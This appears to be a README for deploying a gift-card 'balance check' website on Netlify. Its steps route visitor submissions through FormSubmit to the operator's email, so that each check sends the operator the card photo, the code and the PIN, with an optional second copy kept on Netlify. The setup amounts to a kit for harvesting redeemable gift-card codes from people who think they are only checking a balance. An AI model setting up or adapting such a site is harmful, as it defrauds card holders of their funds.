Balancecheck — drop this folder on Netlify

1. Open notify-email.txt. Delete the lines that start with #.
   Put your email alone on the first line and save.
2. On Netlify: Add new site → Deploy manually.
   Drag this whole folder onto the page.
3. Open the site and send one test balance check.
   You will get a confirmation email from FormSubmit. Click the link in it.
   Until you confirm, card photos and codes will not arrive.
4. After that, every check emails the photo, the code, and the PIN to you.
   Purchases email the order, without a card code.
5. Optional: Netlify → Forms → Form notifications → add the same email.
   Netlify then keeps its own copy of each submission.
6. Domain: Domain management → Add a domain you own, then follow the DNS steps.

The site follows the phone’s light or dark appearance.
Night Shift is applied by the phone to the whole screen, so the site warms
with it automatically.
